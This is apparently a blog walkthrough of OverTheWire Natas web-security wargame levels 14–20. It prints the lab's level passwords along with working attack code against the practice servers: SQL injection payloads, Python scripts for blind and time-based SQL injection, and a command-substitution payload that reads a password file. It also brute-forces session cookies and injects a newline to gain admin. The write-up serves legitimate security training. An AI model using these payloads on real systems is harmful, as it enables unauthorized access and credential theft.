+++
date = '2025-09-09T09:33:06+07:00'
title = 'OverTheWire Natas Walkthrough Levels 14 - 20'
tags = ['OverTheWire', 'CTFs']
description = 'Walkthrough of OverTheWire Natas levels 14 - 20 with step-by-step solutions, hints, and explanations for web security beginners.'
draft = false

[cover]
  image = '/images/posts/natas-cover.png' # path inside /static
  alt = 'Natas cover'
  caption = 'OverTheWire Natas'
  relative = false
+++

The Natas wargame is part of OverTheWire and focuses on web security challenges. This post covers Levels 14 – 20, with hints, answers, and explanations to help you understand the thought process, not just the final solution.

Each level introduces a new vulnerability — from basic HTML inspection to SQL injection, XSS, command injection, file inclusion, and authentication flaws. The goal is to find the password for the next level by analyzing and exploiting the web application.

## Natas Level 14 → Level 15
(Updated: 13 August 2025)

**Credentials**
- **Username:** `natas14`
- **Password:** `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`

**Connection**

Level url: [http://natas14.natas.labs.overthewire.org/](http://natas14.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - This level require us to do some SQL Injection. First look at the source code -> `View sourcecode`.
2. Step 2 - We can see the PHP code:
```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```
Focus on this line:
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
**We can base on this line, to do SQL Injection attack**

3. Step 3 - Add the `username: anything` and `password: anything" or "1" = "1` the `$query` will become:
```sql
SELECT * FROM users where username="anything" and password="anything" or "1" = "1"
```
**By this, the WHERE condition is always true and return all rows in the table `users`.**

4. Step 4 - Submit the username and password so you can get the password for the next level.
5. Step 5 - Take the password to the next level.

**Next Level Password**

`SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`

---

## Natas Level 15 → Level 16
(Updated: 14 August 2025)

**Credentials**
- **Username:** `natas15`
- **Password:** `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`

**Connection**

Level url: [http://natas15.natas.labs.overthewire.org/](http://natas15.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - Click `View sourcecode` and we can see the `php` code:
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```
2. Step 2 - You can see that we can just know **if the user exists** and cannot get the password directly. Therefore, we have to `brute-force` it.
3. Step 3 - Based on the idea, you can try add the `username: natas16" OR "1" = "1` we can get `This user exists.`.
4. Step 4 - Use the `python` code that I created to **brute-force** the password.
```python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx") # Change the password if needed

charset = string.ascii_letters + string.digits  # a-z, A-Z, 0-9

found = ""

# Brute-force the password
print('Start brute-forcing!!')
for i in range(1, 33): 
    for ch in charset:
        payload = f'natas16" AND password LIKE BINARY "{found + ch}%" -- '

        # Send request
        res = requests.post(url, data={"username": payload}, auth=auth)

        # Check response
        if "This user exists." in res.text:
            found += ch
            print(f"[+] Found so far: {found}")
            break

print(f"\n[✅] Final password for natas16: {found}")
```
- Running the code you will get the result:

![Screenshot image](/images/posts/natas_level_15_to_16.png)

5. Step 5 - Take the password to the next level.

**Next Level Password**

`hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`

---

## Natas Level 16 → Level 17
(Updated: 14 August 2025)

**Credentials**
- **Username:** `natas16`
- **Password:** `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`

**Connection**

Level url: [http://natas16.natas.labs.overthewire.org/](http://natas16.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - Click `View sourcecode` and we can see the `php` code:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
**Now it has restricted more characters that require us to brute-force in order to get the password**

2. Step 2 - Use my `python` code in order to the correct password:
```python
import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")  # Replace with your real password

charset = string.ascii_letters + string.digits

found = ""
print('Start brute-forcing!!')
for i in range(1, 33):
    for ch in charset:
        payload = f'$(grep ^{found + ch} /etc/natas_webpass/natas17)'
        res = requests.get(url, params={"needle": payload + "anything"}, auth=auth)
        if "anything" not in res.text:
            found += ch
            print(f"[+] Found so far: {found}")
            break

print(f"[✅] Final password for natas17: {found}")
```
- Idea: `grep ^guess /etc/natas_webpass_natas17` to guess the password through each characters until get the result

3. Step 3 - Run the `python` code to brute-force `natas17` password:

![Screenshot image](/images/posts/natas_level_16_to_17.png)

4. Step 4 - Take the password to the next level.

**Next Level Password**

`EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`

---

## Natas Level 17 → Level 18
(Updated: 14 August 2025)

**Credentials**
- **Username:** `natas17`
- **Password:** `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`

**Connection**

Level url: [http://natas17.natas.labs.overthewire.org/](http://natas17.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - Click `View sourcecode` and we can see the `php` code:
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {}
?>
```
**Now it doesn't have any messages for us to know if we get the correct character.**

2. Step 2 - Use my `python` code in order to the correct password:
```python
import requests, string

url = "http://natas17.natas.labs.overthewire.org/"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

charset = string.ascii_letters + string.digits # a-z, A-Z, 0-9

found = ""
for pos in range(1, 33):
    for ch in charset:
        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{pos},1)="{ch}", SLEEP(5), 0) -- -'
        r = requests.post(url, data={"username": payload}, auth=auth)
        if (r.elapsed.total_seconds() > 5):
            found += ch
            print(f"[+] Found so far: {found}")
            break
    else:
        raise SystemExit(f"No match at position {pos}, try a larger SLEEP or lower threshold.")

print(f"\n[✅] Final password for natas18: {found}")
```
- Idea: `sleep(5)` when find the correct character and check `r.elapsed.total_seconds() > 5` in order to get that character.

3. Step 3 - Run the `python` code to brute-force `natas18` password:

![Screenshot image](/images/posts/natas_level_17_to_18.png)

4. Step 4 - Take the password to the next level.

**Next Level Password**

`6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`

---

## Natas Level 18 → Level 19
(Updated: 15 August 2025)

**Credentials**
- **Username:** `natas18`
- **Password:** `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`

**Connection**

Level url: [http://natas18.natas.labs.overthewire.org/](http://natas18.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - Click `View sourcecode` and we can see the really long `php` code, but focus on these:
```php
$maxid = 640;

function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
```
**We can see that the authentication based on the `PHPSESSID` to determine if it is the admin.**

2. Step 2 - We have to create a `python` code to make requests with different `PHPSESSID` to the `natas18` in order to get the admin account.
3. Step 3 - Use my `python` code in order to get the admin PHPSESSID:
```python
import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"
auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")

max_id = 640

for i in range(0, max_id + 1):
    cookie = f"PHPSESSID={str(i)}"

    headers = {'Cookie': cookie}

    print(f'[+] Getting {cookie}')
    response = requests.get(url, headers=headers, auth=auth)

    if "You are logged in as a regular user" not in response.text:
        print(f"\n[✅] Admin PHPSESSID is: {i}")
        break
```
![Screenshot image](/images/posts/natas_level_18_to_19.png)

4. Step 4 - Use `PHPSESSID = 119` to the `cookie` of the browser to get the password.
5. Step 5 - Take the password to the next level.

**Next Level Password**

`tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`

---

## Natas Level 19 → Level 20
(Updated: 16 August 2025)

**Credentials**
- **Username:** `natas19`
- **Password:** `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`

**Connection**

Level url: [http://natas19.natas.labs.overthewire.org/](http://natas19.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - Try login with account `Username: test`, `Password: test`.
2. Step 2 - Open `Dev Tools -> Application -> Cookies` you can see that the browser has cookie: `PHPSESSID: 37342d74657374`.
3. Step 3 - Use [CyberChef](https://gchq.github.io/CyberChef) to decode that text `From Hex`. You get something like this `74-test`.
4. Step 4 - Now try login with account `Username: admin`, `Password: something`. Decode the text `From Hex`, get `344-admin`

**We can see that the ID has format `id-username` so now we can try different `ids` with `admin`**

5. Step 5 - Use the my `python` code to brute-force the `ids` and get the correct `hex_data`.
```python
import requests

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

max_id = 640

for i in range(0, max_id + 1):
    value = f"{i}-admin"
    bytes_data = value.encode('utf-8')
    # Convert the bytes to a hexadecimal string
    hex_data = bytes_data.hex()
    
    cookie = f"PHPSESSID={hex_data}"

    headers = {'Cookie': cookie}

    print(f'[+] Getting {value}')
    response = requests.get(url, headers=headers, auth=auth)

    if "You are logged in as a regular user" not in response.text:
        print(f"\n[✅] Admin PHPSESSID is: {value} / Hex Data: {hex_data}")
        break
```

![Screenshot image](/images/posts/natas_level_19_to_20.png)

6. Step 6 - Take the correct admin `hex_data` and change the cookie value in browser in order to get the password.
7. Step 7 - Take the password to the next level.

**Next Level Password**

`p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`

---

## Natas Level 20 → Level 21
(Updated: 16 August 2025)

**Credentials**
- **Username:** `natas20`
- **Password:** `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`

**Connection**

Level url: [http://natas20.natas.labs.overthewire.org/](http://natas20.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - In this level we cannot do brute-force `PHPSESSID` because it uses random keys.
2. Step 2 - Investigate the source code we can see that the most thing we have to do is set the `admin = 1`.
3. Step 3 - Add `admin%0Aadmin 1` to `Your name` input and submit to get the password.
4. Step 4 - Take the password to the next level.

**Next Level Password**

`BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`
